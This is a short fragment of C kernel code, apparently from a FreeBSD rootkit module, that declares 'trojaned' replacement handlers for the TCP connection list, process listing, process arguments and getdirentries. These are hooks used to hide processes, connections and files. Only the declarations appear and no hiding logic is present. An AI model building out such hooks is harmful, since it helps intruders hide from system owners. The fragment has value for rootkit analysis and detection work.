
MALLOC_DEFINE (M_PARGS, "proc-args", "Process arguments");
MALLOC_DEFINE (M_DIRP2, "mdirp", "mdirp");

extern int sysctl_out_proc (struct proc *p, struct sysctl_req *req, int doingzomb);
static int trojaned_tcp_pcblist(SYSCTL_HANDLER_ARGS);
static int trojaned_sysctl_kern_proc(SYSCTL_HANDLER_ARGS);
static int trojaned_sysctl_kern_proc_args(SYSCTL_HANDLER_ARGS);
static int trojaned_getdirentries (struct proc *p, struct getdirentries_args *uap);